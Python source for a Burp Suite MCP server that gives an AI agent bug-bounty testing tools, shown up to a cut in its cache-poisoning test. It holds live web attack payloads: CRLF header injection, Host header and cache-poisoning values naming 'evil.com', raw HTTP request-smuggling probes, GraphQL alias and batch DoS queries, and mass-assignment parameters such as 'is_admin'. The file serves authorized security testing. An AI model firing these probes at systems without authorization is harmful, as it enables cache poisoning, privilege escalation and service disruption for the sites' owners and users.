"""Advanced testing tools for bug bounty — API schema parsing, GraphQL deep testing,
business logic, host header, CRLF, request smuggling, mass assignment, cache poisoning."""

import asyncio
import json
import time
import urllib.parse

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client


# Interesting endpoint keywords that flag higher-risk areas
_INTERESTING_KEYWORDS = {
    "auth": ["login", "signin", "signup", "register", "auth", "oauth", "token", "password", "reset", "verify"],
    "file": ["upload", "download", "file", "attachment", "import", "export", "image", "media"],
    "admin": ["admin", "manage", "dashboard", "config", "setting", "internal"],
    "user_crud": ["user", "account", "profile", "member"],
    "payment": ["payment", "billing", "subscription", "checkout", "order", "invoice", "charge", "refund"],
}

# Parameter name to suggested vuln test mapping
_PARAM_VULN_MAP = {
    "id": "IDOR", "user_id": "IDOR", "account_id": "IDOR", "uid": "IDOR", "pid": "IDOR",
    "search": "XSS", "q": "XSS", "query": "XSS", "name": "XSS", "comment": "XSS",
    "file": "LFI", "filename": "LFI", "path": "LFI", "filepath": "LFI", "template": "SSTI",
    "url": "SSRF", "uri": "SSRF", "href": "SSRF", "callback": "SSRF", "redirect": "Open Redirect",
    "redirect_url": "Open Redirect", "next": "Open Redirect", "return_url": "Open Redirect",
    "cmd": "Command Injection", "command": "Command Injection", "exec": "Command Injection",
    "email": "Injection", "sort": "SQLi", "order": "SQLi", "filter": "SQLi/NoSQLi",
}

# Mass assignment common extra params
_MASS_ASSIGN_PARAMS = [
    "role", "is_admin", "admin", "verified", "active", "price", "discount",
    "balance", "permissions", "group", "type", "status", "plan", "credits",
    "is_staff", "approved", "privilege", "level",
]


def register(mcp: FastMCP):

    @mcp.tool()
    async def parse_api_schema(url: str = "", schema_text: str = "") -> str:
        """Parse an OpenAPI/Swagger spec and extract testable endpoints with vuln test suggestions.

        Example:
            parse_api_schema(url="https://api.example.com/openapi.json")
            parse_api_schema(schema_text='{"openapi":"3.0.0",...}')

        Args:
            url: URL to fetch the OpenAPI/Swagger spec from
            schema_text: Raw schema text (JSON) — use if you already have the spec
        """
        if not url and not schema_text:
            return "Error: Provide either 'url' to fetch spec or 'schema_text' with raw spec content"

        # Fetch spec if URL provided
        if url:
            resp = await client.post("/api/http/curl", json={"url": url, "method": "GET"})
            if "error" in resp:
                return f"Error fetching spec: {resp['error']}"
            schema_text = resp.get("response_body", resp.get("body", ""))
            if not schema_text:
                return "Error: Empty response from spec URL"

        # Parse JSON
        try:
            spec = json.loads(schema_text)
        except json.JSONDecodeError:
            return "Error: Could not parse schema as JSON. Only JSON specs are supported."

        # Detect version
        version = "unknown"
        if "openapi" in spec:
            version = f"OpenAPI {spec['openapi']}"
        elif "swagger" in spec:
            version = f"Swagger {spec['swagger']}"

        # Extract base URL
        base_url = ""
        if "servers" in spec and spec["servers"]:
            base_url = spec["servers"][0].get("url", "")
        elif "host" in spec:
            scheme = (spec.get("schemes") or ["https"])[0]
            base_path = spec.get("basePath", "")
            base_url = f"{scheme}://{spec['host']}{base_path}"

        # Extract paths
        paths = spec.get("paths", {})
        lines = [f"API Schema: {version}"]
        if base_url:
            lines.append(f"Base URL: {base_url}")
        lines.append(f"Endpoints: {len(paths)}\n")

        endpoint_count = 0
        interesting_endpoints = []

        for path, methods in paths.items():
            if not isinstance(methods, dict):
                continue
            for method, details in methods.items():
                if method.startswith("x-") or method == "parameters":
                    continue
                if not isinstance(details, dict):
                    continue

                endpoint_count += 1
                summary = details.get("summary", details.get("operationId", ""))

                # Extract parameters
                params = []
                all_params = details.get("parameters", []) + methods.get("parameters", [])
                for p in all_params:
                    if not isinstance(p, dict):
                        continue
                    params.append({
                        "name": p.get("name", "?"),
                        "in": p.get("in", "?"),
                        "required": p.get("required", False),
                        "type": p.get("schema", {}).get("type", p.get("type", "?")),
                    })

                # Extract request body params (OpenAPI 3.x)
                req_body = details.get("requestBody", {})
                if isinstance(req_body, dict):
                    content = req_body.get("content", {})
                    for ctype, schema_info in content.items():
                        if not isinstance(schema_info, dict):
                            continue
                        props = schema_info.get("schema", {}).get("properties", {})
                        required = schema_info.get("schema", {}).get("required", [])
                        for pname, pinfo in props.items():
                            params.append({
                                "name": pname,
                                "in": "body",
                                "required": pname in required,
                                "type": pinfo.get("type", "?") if isinstance(pinfo, dict) else "?",
                            })

                # Flag interesting endpoints
                path_lower = path.lower()
                tags = []
                for tag, keywords in _INTERESTING_KEYWORDS.items():
                    if any(kw in path_lower for kw in keywords):
                        tags.append(tag)

                # Suggest vuln tests based on param names
                suggestions = []
                for p in params:
                    pname = p["name"].lower()
                    for key, vuln in _PARAM_VULN_MAP.items():
                        if key == pname or (len(key) > 3 and key in pname):
                            suggestions.append(f"{p['name']} -> {vuln}")
                            break

                # Format output
                method_upper = method.upper()
                line = f"  {method_upper} {path}"
                if summary:
                    line += f"  # {summary}"
                lines.append(line)

                if tags:
                    interesting_endpoints.append(f"{method_upper} {path} [{', '.join(tags)}]")
                    lines.append(f"    [!] Tags: {', '.join(tags)}")

                if params:
                    param_strs = []
                    for p in params:
                        req = "*" if p["required"] else ""
                        param_strs.append(f"{p['name']}{req}({p['in']}/{p['type']})")
                    lines.append(f"    Params: {', '.join(param_strs)}")

                if suggestions:
                    lines.append(f"    Vuln tests: {', '.join(suggestions)}")

        # Summary
        lines.insert(3, f"Total operations: {endpoint_count}")
        if interesting_endpoints:
            lines.append(f"\n--- High-Interest Endpoints ({len(interesting_endpoints)}) ---")
            for ep in interesting_endpoints:
                lines.append(f"  {ep}")

        return "\n".join(lines)

    @mcp.tool()
    async def test_graphql_deep(session: str, path: str = "/graphql") -> str:
        """Extended GraphQL testing — introspection, field suggestions, alias DoS, batching,
        depth limits, and type enumeration.

        Example:
            test_graphql_deep(session="my_session", path="/graphql")

        Args:
            session: Session name for auth state
            path: GraphQL endpoint path (default /graphql)
        """
        results = []
        tests_passed = 0
        risks = []

        async def _gql(query: str, as_array: bool = False) -> dict:
            body = [{"query": query}] if as_array else {"query": query}
            return await client.post("/api/session/request", json={
                "session": session, "method": "POST", "path": path,
                "headers": {"Content-Type": "application/json"},
                "body": json.dumps(body),
            })

        # Test 1: Introspection
        resp = await _gql("{__schema{types{name,fields{name}}}}")
        if "error" in resp:
            return f"Error reaching GraphQL endpoint: {resp['error']}"

        body = resp.get("response_body", "")
        status = resp.get("status", 0)
        has_schema = "__schema" in body and "types" in body

        results.append("Test 1 — Introspection:")
        if has_schema:
            tests_passed += 1
            risks.append("Introspection enabled — full schema exposed")
            # Count types
            try:
                gql_resp = json.loads(body)
                types = gql_resp.get("data", {}).get("__schema", {}).get("types", [])
                user_types = [t for t in types if not t.get("name", "").startswith("__")]
                results.append(f"  EXPOSED — {len(user_types)} types found")
                for t in user_types[:15]:
                    fields = [f["name"] for f in (t.get("fields") or [])[:8]]
                    results.append(f"    {t['name']}: {', '.join(fields) if fields else '(no fields)'}")
                if len(user_types) > 15:
                    results.append(f"    ... and {len(user_types) - 15} more types")
            except (json.JSONDecodeError, KeyError):
                results.append(f"  EXPOSED — response contains schema data (status {status})")
        else:
            results.append(f"  Blocked or not available (status {status})")

        # Test 2: Field suggestions via malformed query
        resp2 = await _gql("{__nonexistent_field_xyz}")
        body2 = resp2.get("response_body", "")
        results.append("\nTest 2 — Field Suggestions (error leakage):")
        if "did you mean" in body2.lower() or "suggestion" in body2.lower():
            tests_passed += 1
            risks.append("Field suggestions in errors — enables schema enumeration without introspection")
            results.append(f"  EXPOSED — error reveals field suggestions")
            # Extract suggestion snippet
            snippet = body2[:300].replace("\n", " ")
            results.append(f"  Snippet: {snippet}")
        else:
            results.append(f"  No suggestions leaked (status {resp2.get('status', '?')})")

        # Test 3: Alias-based DoS
        aliases = " ".join(f"a{i}:__typename" for i in range(100))
        resp3 = await _gql("{" + aliases + "}")
        status3 = resp3.get("status", 0)
        body3 = resp3.get("response_body", "")
        results.append("\nTest 3 — Alias-based DoS (100 aliases):")
        if status3 == 200 and "a99" in body3:
            tests_passed += 1
            risks.append("No alias limit — potential DoS via query amplification")
            results.append(f"  VULNERABLE — all 100 aliases executed (status {status3})")
        elif status3 == 200:
            results.append(f"  Partial — status 200 but aliases may be limited")
        else:
            results.append(f"  Blocked or limited (status {status3})")

        # Test 4: Batch query abuse
        resp4 = await client.post("/api/session/request", json={
            "session": session, "method": "POST", "path": path,
            "headers": {"Content-Type": "application/json"},
            "body": json.dumps([{"query": "{__typename}"} for _ in range(10)]),
        })
        status4 = resp4.get("status", 0)
        body4 = resp4.get("response_body", "")
        results.append("\nTest 4 — Batch Query Abuse (10 queries):")
        if status4 == 200 and body4.strip().startswith("["):
            try:
                batch_resp = json.loads(body4)
                if isinstance(batch_resp, list) and len(batch_resp) >= 10:
                    tests_passed += 1
                    risks.append("Batch queries accepted — enables rate limit bypass and DoS")
                    results.append(f"  VULNERABLE — {len(batch_resp)} responses returned")
                else:
                    results.append(f"  Partial — array response with {len(batch_resp) if isinstance(batch_resp, list) else '?'} items")
            except json.JSONDecodeError:
                results.append(f"  Array response but could not parse")
        else:
            results.append(f"  Blocked or unsupported (status {status4})")

        # Test 5: Depth limit testing
        # Build deeply nested query
        depth_query = "{user" + "{posts{comments{author" * 5 + "{name}" + "}" * 15 + "}"
        resp5 = await _gql(depth_query)
        status5 = resp5.get("status", 0)
        body5 = resp5.get("response_body", "")
        results.append("\nTest 5 — Query Depth Limit:")
        has_depth_error = any(kw in body5.lower() for kw in ["depth", "complexity", "too deep", "max"])
        if has_depth_error:
            results.append(f"  Protected — depth/complexity limit enforced (status {status5})")
        elif status5 == 200 and "error" not in body5.lower():
            tests_passed += 1
            risks.append("No query depth limit — potential DoS via deeply nested queries")
            results.append(f"  NO LIMIT — deep query accepted (status {status5})")
        else:
            results.append(f"  Query failed (status {status5}) — may have schema mismatch or limit")

        # Test 6: __typename enumeration
        resp6 = await _gql("{__typename}")
        body6 = resp6.get("response_body", "")
        results.append("\nTest 6 — __typename Enumeration:")
        try:
            typename_resp = json.loads(body6)
            typename = typename_resp.get("data", {}).get("__typename", "")
            if typename:
                results.append(f"  Root type: {typename}")
            else:
                results.append(f"  __typename not exposed")
        except (json.JSONDecodeError, AttributeError):
            results.append(f"  Could not parse response")

        # Summary
        results.append(f"\n--- Summary ---")
        results.append(f"Tests with findings: {tests_passed}/6")
        if risks:
            results.append("Risks:")
            for r in risks:
                results.append(f"  [!] {r}")
        else:
            results.append("No significant risks detected.")

        return "\n".join(results)

    @mcp.tool()
    async def test_business_logic(
        session: str,
        endpoint: str,
        parameter: str,
        test_type: str = "all",
    ) -> str:
        """Test business logic flaws — negative values, zero, large numbers, type confusion, boundary.

        Example:
            test_business_logic(session="s1", endpoint="/api/purchase", parameter="quantity", test_type="all")

        Args:
            session: Session name for auth state
            endpoint: Target endpoint path
            parameter: Parameter name to test (e.g. price, quantity, amount)
            test_type: Test category — "all", "negative_values", "zero_values", "large_values", "type_confusion", "boundary"
        """
        test_cases = {}

        if test_type in ("all", "negative_values"):
            test_cases["negative_values"] = [
                (-1, "Negative one"),
                (-100, "Negative hundred"),
                (-999, "Large negative"),
                (-0.01, "Small negative decimal"),
            ]

        if test_type in ("all", "zero_values"):
            test_cases["zero_values"] = [
                (0, "Zero"),
                (0.0, "Float zero"),
                ("0", "String zero"),
                ("00", "Double zero string"),
            ]

        if test_type in ("all", "large_values"):
            test_cases["large_values"] = [
                (999999999, "Large number"),
                (2147483647, "INT32_MAX"),
                (2147483648, "INT32_MAX + 1"),
                (9999999999999, "Very large"),
                (0.0001, "Very small decimal"),
            ]

        if test_type in ("all", "type_confusion"):
            test_cases["type_confusion"] = [
                ("abc", "String where number expected"),
                (True, "Boolean true"),
                (False, "Boolean false"),
                (None, "Null value"),
                ([], "Empty array"),
                ({}, "Empty object"),
                ("1e308", "Scientific notation overflow"),
                ("NaN", "NaN string"),
                ("Infinity", "Infinity string"),
            ]

        if test_type in ("all", "boundary"):
            test_cases["boundary"] = [
                ("", "Empty string"),
                (" ", "Whitespace only"),
                ("a" * 10000, "Very long string (10K chars)"),
                ("\x00", "Null byte"),
                ("-1", "Negative as string"),
                ("1.1.1", "Invalid number format"),
            ]

        if not test_cases:
            return f"Error: Invalid test_type '{test_type}'. Use: all, negative_values, zero_values, large_values, type_confusion, boundary"

        # Get baseline
        baseline_resp = await client.post("/api/session/request", json={
            "session": session, "method": "POST", "path": endpoint,
            "headers": {"Content-Type": "application/json"},
            "body": json.dumps({parameter: 1}),
        })
        if "error" in baseline_resp:
            return f"Error getting baseline: {baseline_resp['error']}"

        baseline_status = baseline_resp.get("status", 0)
        baseline_length = len(baseline_resp.get("response_body", ""))
        baseline_body = baseline_resp.get("response_body", "")

        lines = [
            f"Business Logic Tests: {endpoint} [{parameter}]",
            f"Baseline: status={baseline_status}, length={baseline_length}\n",
        ]

        anomalies = []

        for category, tests in test_cases.items():
            lines.append(f"--- {category} ---")
            for value, desc in tests:
                resp = await client.post("/api/session/request", json={
                    "session": session, "method": "POST", "path": endpoint,
                    "headers": {"Content-Type": "application/json"},
                    "body": json.dumps({parameter: value}),
                })

                if "error" in resp:
                    lines.append(f"  {desc} ({_fmt_val(value)}): Error — {resp['error']}")
                    continue

                status = resp.get("status", 0)
                body = resp.get("response_body", "")
                length = len(body)
                length_diff_pct = abs(length - baseline_length) / max(baseline_length, 1) * 100

                flags = []
                if status != baseline_status:
                    flags.append(f"STATUS:{status}")
                if length_diff_pct > 20:
                    flags.append(f"LENGTH:{length_diff_pct:.0f}%")
                # Check for error messages that leak info
                for kw in ["error", "exception", "stack", "traceback", "invalid", "type"]:
                    if kw in body.lower() and kw not in baseline_body.lower():
                        flags.append(f"KEYWORD:{kw}")
                        break

                flag_str = " ".join(f"[!{f}]" for f in flags) if flags else "[OK]"
                lines.append(f"  {desc} ({_fmt_val(value)}): status={status} len={length} {flag_str}")

                if flags:
                    anomalies.append((desc, value, flags, body[:200]))
                    lines.append(f"    > {body[:150]}")

        # Summary
        lines.append(f"\n--- Summary ---")
        lines.append(f"Anomalies: {len(anomalies)}/{sum(len(v) for v in test_cases.values())} tests")
        if anomalies:
            lines.append("Flagged:")
            for desc, val, flags, _ in anomalies:
                lines.append(f"  {desc} ({_fmt_val(val)}): {', '.join(flags)}")

        return "\n".join(lines)

    @mcp.tool()
    async def test_host_header(session: str, path: str = "/") -> str:
        """Test Host header injection — alternate host, duplicate headers, X-Forwarded-Host,
        host with port abuse, absolute URL.

        Example:
            test_host_header(session="s1", path="/password-reset")

        Args:
            session: Session name for auth state
            path: Endpoint path to test (default /)
        """
        lines = [f"Host Header Injection Tests: {path}\n"]
        findings = []

        # Get baseline first
        baseline = await client.post("/api/session/request", json={
            "session": session, "method": "GET", "path": path,
        })
        if "error" in baseline:
            return f"Error getting baseline: {baseline['error']}"
        baseline_body = baseline.get("response_body", "")
        baseline_status = baseline.get("status", 0)

        tests = [
            ("Alternate Host", {"Host": "evil.com"}, "evil.com"),
            ("X-Forwarded-Host", {"X-Forwarded-Host": "evil.com"}, "evil.com"),
            ("X-Forwarded-For + Host", {"X-Forwarded-Host": "evil.com", "X-Forwarded-For": "127.0.0.1"}, "evil.com"),
            ("X-Original-URL", {"X-Original-URL": "/admin"}, "/admin"),
            ("X-Rewrite-URL", {"X-Rewrite-URL": "/admin"}, "/admin"),
        ]

        for test_name, headers, check_value in tests:
            resp = await client.post("/api/http/send", json={
                "method": "GET",
                "url": baseline.get("url", f"http://target{path}"),
                "headers": headers,
            })
            if "error" in resp:
                lines.append(f"  [{test_name}] Error: {resp['error']}")
                continue

            body = resp.get("response_body", resp.get("body", ""))
            status = resp.get("status_code", resp.get("status", 0))

            # Check for reflection in body
            reflected_body = check_value.lower() in body.lower() and check_value.lower() not in baseline_body.lower()

            # Check for reflection in headers (Location, Set-Cookie, etc.)
            reflected_header = False
            location = ""
            for h in resp.get("response_headers", resp.get("headers", [])):
                hname = h.get("name", "").lower() if isinstance(h, dict) else ""
                hval = h.get("value", "") if isinstance(h, dict) else ""
                if check_value.lower() in hval.lower():
                    reflected_header = True
                    location = f"{hname}: {hval}"

            flags = []
            if reflected_body:
                flags.append("REFLECTED_IN_BODY")
            if reflected_header:
                flags.append(f"REFLECTED_IN_HEADER({location})")
            if status != baseline_status:
                flags.append(f"STATUS_CHANGE:{status}")

            if flags:
                findings.append((test_name, flags))
                flag_str = " ".join(f"[!{f}]" for f in flags)
                lines.append(f"  [{test_name}] {flag_str}")
                if reflected_body:
                    # Show context around reflection
                    idx = body.lower().find(check_value.lower())
                    start = max(0, idx - 50)
                    end = min(len(body), idx + len(check_value) + 50)
                    lines.append(f"    Body context: ...{body[start:end]}...")
            else:
                lines.append(f"  [{test_name}] No reflection (status {status})")

        # Summary
        lines.append(f"\n--- Summary ---")
        if findings:
            lines.append(f"Findings: {len(findings)}/{len(tests)} tests showed injection")
            for name, flags in findings:
                lines.append(f"  [!] {name}: {', '.join(flags)}")
            lines.append("\nRisk: Host header reflected — check for cache poisoning, password reset poisoning, or SSRF.")
        else:
            lines.append("No host header injection detected.")

        return "\n".join(lines)

    @mcp.tool()
    async def test_crlf_injection(session: str, path: str, parameter: str = "") -> str:
        """Test for CRLF injection / HTTP response splitting in URL path and parameters.

        Example:
            test_crlf_injection(session="s1", path="/redirect", parameter="url")

        Args:
            session: Session name for auth state
            path: Target endpoint path
            parameter: Optional parameter name to inject into (tests path if empty)
        """
        payloads = [
            ("%0d%0aInjected-Header:true", "Injected-Header"),
            ("%0d%0aSet-Cookie:evil=true", "Set-Cookie"),
            ("%0d%0a%0d%0a<html>INJECTED</html>", "INJECTED"),
            ("\\r\\nInjected-Header:true", "Injected-Header"),
            ("%E5%98%8A%E5%98%8DInjected-Header:true", "Injected-Header"),  # Unicode CRLF
        ]

        lines = [f"CRLF Injection Tests: {path}"]
        if parameter:
            lines[0] += f" [{parameter}]"
        lines.append("")

        findings = []

        for payload, check_str in payloads:
            if parameter:
                # Inject into query parameter
                test_path = f"{path}?{parameter}={payload}"
            else:
                # Inject into URL path
                test_path = f"{path}/{payload}"

            resp = await client.post("/api/session/request", json={
                "session": session, "method": "GET", "path": test_path,
            })
            if "error" in resp:
                lines.append(f"  Payload {payload[:30]}: Error — {resp['error']}")
                continue

            body = resp.get("response_body", "")
            status = resp.get("status", 0)

            # Check if injected header appears in response headers
            header_injected = False
            for h in resp.get("response_headers", []):
                hname = h.get("name", "") if isinstance(h, dict) else ""
                if "injected" in hname.lower() or (check_str.lower() in hname.lower() and "evil" in h.get("value", "").lower()):
                    header_injected = True
                    break

            # Check if content was injected after double CRLF
            body_injected = check_str in body and "<html>" not in body[:100]

            flags = []
            if header_injected:
                flags.append("HEADER_INJECTED")
            if body_injected:
                flags.append("BODY_INJECTED")

            if flags:
                findings.append((payload, flags))
                lines.append(f"  [{', '.join(flags)}] Payload: {payload[:50]}")
                if header_injected:
                    lines.append(f"    Injected header found in response headers!")
                if body_injected:
                    lines.append(f"    Injected content found in response body!")
            else:
                lines.append(f"  [OK] {payload[:40]} — no injection (status {status})")

        # Summary
        lines.append(f"\n--- Summary ---")
        if findings:
            lines.append(f"VULNERABLE — {len(findings)}/{len(payloads)} payloads succeeded")
            lines.append("Risk: CRLF injection can lead to response splitting, XSS, cache poisoning, session fixation.")
        else:
            lines.append("No CRLF injection detected.")

        return "\n".join(lines)

    @mcp.tool()
    async def test_request_smuggling(session: str, path: str = "/") -> str:
        """Test for HTTP request smuggling (CL.TE and TE.CL) using timing-based detection.
        Uses safe detection payloads only — no destructive testing.

        Example:
            test_request_smuggling(session="s1", path="/")

        Args:
            session: Session name for auth state
            path: Target endpoint path (default /)
        """
        # We need the target host from session to construct raw requests
        # First, get a baseline to determine timing and extract target info
        baseline = await client.post("/api/session/request", json={
            "session": session, "method": "GET", "path": path,
        })
        if "error" in baseline:
            return f"Error: {baseline['error']}"

        target_url = baseline.get("url", "")
        baseline_time = baseline.get("response_time", 0)

        lines = [f"Request Smuggling Tests: {path}\n"]
        lines.append(f"Baseline response time: {baseline_time}ms")
        findings = []

        # Extract host/port from URL
        try:
            parsed = urllib.parse.urlparse(target_url)
            host = parsed.hostname or "target"
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            is_https = parsed.scheme == "https"
        except Exception:
            host = "target"
            port = 443
            is_https = True

        # CL.TE probe: Content-Length says body is short, but Transfer-Encoding: chunked
        # sends incomplete chunk, causing timeout if front-end uses CL and back-end uses TE
        clte_raw = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"Q"
        )

        # TE.CL probe: Transfer-Encoding: chunked is processed first, Content-Length mismatch
        tecl_raw = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"
        )

        probes = [
            ("CL.TE", clte_raw),
            ("TE.CL", tecl_raw),
        ]

        for probe_name, raw_request in probes:
            lines.append(f"\n--- {probe_name} Probe ---")

            # Send the probe and measure timing
            start = time.time()
            resp = await client.post("/api/http/raw", json={
                "raw": raw_request,
                "host": host,
                "port": port,
                "https": is_https,
            })
            elapsed = int((time.time() - start) * 1000)

            if "error" in resp:
                lines.append(f"  Error: {resp['error']}")
                # Timeout can indicate smuggling
                if "timeout" in resp["error"].lower() or elapsed > 5000:
                    findings.append(probe_name)
                    lines.append(f"  [!] TIMEOUT ({elapsed}ms) — potential {probe_name} smuggling")
                continue

            status = resp.get("status_code", resp.get("status", 0))
            lines.append(f"  Status: {status}, Time: {elapsed}ms (baseline: {baseline_time}ms)")

            # Significant timing difference suggests smuggling
            if elapsed > baseline_time * 3 and elapsed > 3000:
                findings.append(probe_name)
                lines.append(f"  [!] Significant delay — potential {probe_name} smuggling")
            elif status == 400:
                lines.append(f"  Server rejected malformed request (400) — likely not vulnerable")
            else:
                lines.append(f"  No anomaly detected")

        # TE.TE probe: obfuscated Transfer-Encoding
        tete_variants = [
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding:\tchunked",
        ]

        lines.append(f"\n--- TE.TE Obfuscation Probes ---")
        for variant in tete_variants:
            te_raw = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"{variant}\r\n"
                f"\r\n"
                f"1\r\n"
                f"Z\r\n"
                f"Q"
            )

            start = time.time()
            resp = await client.post("/api/http/raw", json={
                "raw": te_raw, "host": host, "port": port, "https": is_https,
            })
            elapsed = int((time.time() - start) * 1000)

            variant_short = variant.split("\r\n")[0][:40]
            if "error" in resp:
                if "timeout" in resp["error"].lower() or elapsed > 5000:
                    findings.append(f"TE.TE({variant_short})")
                    lines.append(f"  [!] {variant_short}: TIMEOUT ({elapsed}ms)")
                else:
                    lines.append(f"  {variant_short}: Error — {resp['error']}")
            else:
                status = resp.get("status_code", resp.get("status", 0))
                if elapsed > baseline_time * 3 and elapsed > 3000:
                    findings.append(f"TE.TE({variant_short})")
                    lines.append(f"  [!] {variant_short}: Delay {elapsed}ms")
                else:
                    lines.append(f"  {variant_short}: status={status}, {elapsed}ms — OK")

        # Summary
        lines.append(f"\n--- Summary ---")
        if findings:
            lines.append(f"Potential smuggling: {', '.join(findings)}")
            lines.append("Recommendation: Verify with repeated timing tests (3+ repetitions). Use Collaborator for confirmation.")
        else:
            lines.append("No request smuggling indicators detected.")

        return "\n".join(lines)

    @mcp.tool()
    async def test_mass_assignment(
        session: str,
        method: str,
        path: str,
        known_params: dict,
        extra_params: dict | None = None,
    ) -> str:
        """Test for mass assignment / parameter binding by injecting extra parameters.

        Example:
            test_mass_assignment(session="s1", method="POST", path="/api/profile",
                known_params={"name": "test"}, extra_params={"role": "admin", "is_admin": true})

        Args:
            session: Session name for auth state
            method: HTTP method (POST, PUT, PATCH)
            path: Target endpoint path
            known_params: Known/expected parameters dict (baseline)
            extra_params: Extra parameters to inject (uses common defaults if empty)
        """
        # Use provided extras or default set
        if not extra_params:
            extra_params = {p: _mass_assign_value(p) for p in _MASS_ASSIGN_PARAMS}

        # Baseline: known params only
        baseline_resp = await client.post("/api/session/request", json={
            "session": session, "method": method, "path": path,
            "headers": {"Content-Type": "application/json"},
            "body": json.dumps(known_params),
        })
        if "error" in baseline_resp:
            return f"Error getting baseline: {baseline_resp['error']}"

        baseline_status = baseline_resp.get("status", 0)
        baseline_body = baseline_resp.get("response_body", "")
        baseline_length = len(baseline_body)

        lines = [
            f"Mass Assignment Test: {method} {path}",
            f"Known params: {list(known_params.keys())}",
            f"Extra params to test: {list(extra_params.keys())}",
            f"Baseline: status={baseline_status}, length={baseline_length}\n",
        ]

        # Test all extra params at once first
        combined = {**known_params, **extra_params}
        combined_resp = await client.post("/api/session/request", json={
            "session": session, "method": method, "path": path,
            "headers": {"Content-Type": "application/json"},
            "body": json.dumps(combined),
        })

        accepted = []
        rejected = []

        if "error" in combined_resp:
            lines.append(f"Combined request error: {combined_resp['error']}")
        else:
            combined_status = combined_resp.get("status", 0)
            combined_body = combined_resp.get("response_body", "")

            if combined_status == baseline_status:
                lines.append(f"Combined request: status={combined_status} (same as baseline)")
                # Check which params are reflected in response
                for param, value in extra_params.items():
                    str_val = str(value).lower()
                    param_lower = param.lower()
                    if param_lower in combined_body.lower() or str_val in combined_body.lower():
                        if param_lower not in baseline_body.lower() and str_val not in baseline_body.lower():
                            accepted.append(param)
                # If response is different, something was accepted
                if combined_body != baseline_body:
                    length_diff = abs(len(combined_body) - baseline_length)
                    lines.append(f"  Response body differs by {length_diff} bytes")
            else:
                lines.append(f"Combined request: status={combined_status} (different from baseline {baseline_status})")

        # Test individual extra params for more detail
        lines.append("\n--- Individual Parameter Tests ---")
        for param, value in extra_params.items():
            test_params = {**known_params, param: value}
            resp = await client.post("/api/session/request", json={
                "session": session, "method": method, "path": path,
                "headers": {"Content-Type": "application/json"},
                "body": json.dumps(test_params),
            })

            if "error" in resp:
                lines.append(f"  {param}={_fmt_val(value)}: Error")
                continue

            status = resp.get("status", 0)
            body = resp.get("response_body", "")
            length = len(body)

            flags = []
            str_val = str(value).lower()
            param_lower = param.lower()

            # Check reflection
            if (param_lower in body.lower() or str_val in body.lower()) and \
               (param_lower not in baseline_body.lower() and str_val not in baseline_body.lower()):
                flags.append("REFLECTED")
                if param not in accepted:
                    accepted.append(param)

            # Check behavior change
            if status != baseline_status:
                flags.append(f"STATUS:{status}")
            if abs(length - baseline_length) > baseline_length * 0.1:
                flags.append(f"LENGTH_DIFF")
            if body != baseline_body and not flags:
                flags.append("BODY_CHANGED")

            if flags:
                flag_str = " ".join(f"[!{f}]" for f in flags)
                lines.append(f"  {param}={_fmt_val(value)}: {flag_str}")
            else:
                rejected.append(param)

        # Summary
        lines.append(f"\n--- Summary ---")
        if accepted:
            lines.append(f"ACCEPTED (reflected/changed behavior): {', '.join(accepted)}")
            lines.append("Risk: Server may bind these parameters — test if they persist or change authorization.")
        if rejected:
            lines.append(f"Rejected/ignored: {', '.join(rejected[:10])}" + (f" +{len(rejected)-10} more" if len(rejected) > 10 else ""))
        if not accepted:
            lines.append("No mass assignment indicators detected.")

        return "\n".join(lines)

    @mcp.tool()
    async def test_cache_poisoning(session: str, path: str = "/") -> str:
        """Test for web cache poisoning and cache deception vulnerabilities.

        Example:
            test_cache_poisoning(session="s1", path="/")

        Args:
            session: Session name for auth state
            path: Target endpoint path (default /)
        """
        import hashlib

        lines = [f"Cache Poisoning Tests: {path}\n"]
        findings = []

        # Generate unique cache buster
        cb = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

        # Test 1: Unkeyed header injection
        lines.append("--- Test 1: Unkeyed Header Injection ---")
        unkeyed_headers = [
            ("X-Forwarded-Host", "evil.com"),
            ("X-Forwarded-Scheme", "http"),
            ("X-Original-URL", "/evil"),
            ("X-Rewrite-URL", "/evil"),
            ("X-Forwarded-Prefix", "/evil"),
        ]

        for header_name, header_value in unkeyed_headers:
            # Send with evil header + cache buster
            cache_path = f"{path}?cb={cb}-{header_name[:4]}"
            resp1 = await client.post("/api/session/request", json={
                "session": session, "method": "GET", "path": cache_path,
                "headers": {header_name: header_value},
            })
            if "error" in resp1:
                lines.append(f"  {header_name}: Error — {resp1['error']}")
                continue

            body1 = resp1.get("response_body", "")
            reflected = header_value.lower() in body1.lower()

            if reflected:
                # Send same URL without evil header — check if poisoned response is cached
                resp2 = await client.post("/api/session/request", json={
                    "session": session, "method": "GET", "path": cache_path,
                })
                body2 = resp2.get("response_body", "") if "error" not in resp2 else ""
                cached = header_value.lower() in body2.lower()

                if cached:
                    findings.append(f"Cache poisoned via {header_name}")
                    lines.append(f"  [!!] {header_name}: CACHE POISONED — evil value persists without header")
                else:
                    lines.append(f"  [!] {header_name}: Reflected but NOT cached")
            else:
                lines.append(f"  {header_name}: Not reflected")

        # Test 2: Cache deception
        lines.append("\n--- Test 2: Cache Deception ---")
        deception_paths = [
            f"{path}/nonexist.css",
            f"{path}/nonexist.js",
            f"{path}/nonexist.png",
            f"{path}%2f..%2fnonexist.css",
        ]

        for test_path in deception_paths:
            resp = await client.post("/api/session/request", json={
                "session": session, "method": "GET", "path": test_path,
            })
            if "error" in resp:
                lines.append(f"  {test_path}: Error")
                continue

            status = resp.get("status", 0)
            body = resp.get("response_body", "")

            # Check cache headers
            cache_control = ""
            is_cached = False
            for h in resp.get("response_headers", []):
                hname = h.get("name", "").lower() if isinstance(h, dict) else ""
